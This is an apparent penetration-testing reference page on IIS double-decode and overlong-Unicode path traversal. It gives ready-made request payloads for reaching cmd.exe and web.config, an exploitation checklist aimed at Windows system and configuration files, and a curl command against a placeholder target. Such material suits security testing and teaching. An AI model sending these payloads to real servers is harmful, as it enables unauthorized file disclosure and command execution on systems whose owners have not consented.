---
title: "IIS double-decode and Unicode traversal: multi-stage decoding that smuggles ../"
description: "Exploiting IIS decoding behavior: double-encoded traversal that resolves to ../ after a second decode, and overlong Unicode slash encodings on legacy IIS, to escape the web root."
keywords:
  - double decode
  - double encoding
  - unicode traversal
  - overlong utf-8
  - IIS
---

# Double-decode and Unicode traversal

IIS historically decoded request paths more than once, or decoded lenient Unicode forms, so a payload that looks harmless to a filter becomes a traversal sequence after a later decode. This is the mechanism behind the classic IIS directory-traversal bugs, and the double-decode pattern still appears wherever decode stages stack (a WAF decodes once, IIS decodes again).

## Double encoding

`/` is `%2f`; the `%` in `%2f` is `%25`, so `%252f` decodes once to `%2f` and twice to `/`. Likewise `%252e` decodes twice to `.`, so `%252e%252e%252f` becomes `../` after two passes:

```
GET /scripts/%252e%252e/%252e%252e/winnt/system32/cmd.exe HTTP/1.1
GET /app/%252e%252e%252fweb.config HTTP/1.1
```

A filter that decodes once and checks for `../` sees `%2e%2e/` (no match) and forwards it; IIS decodes again and maps `../`.

## Overlong Unicode (legacy IIS)

Older IIS accepted overlong UTF-8 encodings of `/` and `\`, so a single decode of a non-canonical sequence produced a separator that the filter never recognized:

```
GET /scripts/..%c0%af../winnt/system32/cmd.exe HTTP/1.1
GET /scripts/..%c1%9c../ HTTP/1.1
```

`%c0%af` and `%c1%9c` are overlong encodings of `/` and `\`. These target the classic IIS Unicode traversal and remain worth testing against legacy Windows stacks.

## Exploitation

- Take a traversal payload filtered in single-encoded form and re-encode every `%` as `%25`: `..%2f` becomes `..%252f`; mix depths to match the number of decode passes in the chain.
- Add overlong/Unicode slash variants against older IIS.
- Target Windows paths (`/windows/win.ini`, `web.config`, app source) and, on very old stacks, `cmd.exe` for command execution via the scripts directory.
- Send with `curl --path-as-is` so the client does not decode or normalize the payload first.

```bash
curl --path-as-is "https://target/app/%252e%252e%252fweb.config"
```

## Tools

- Burp Intruder with double-encoding/Unicode wordlists; **curl --path-as-is**.

## References

- OWASP: Double encoding
- Historical IIS Unicode and double-decode advisories
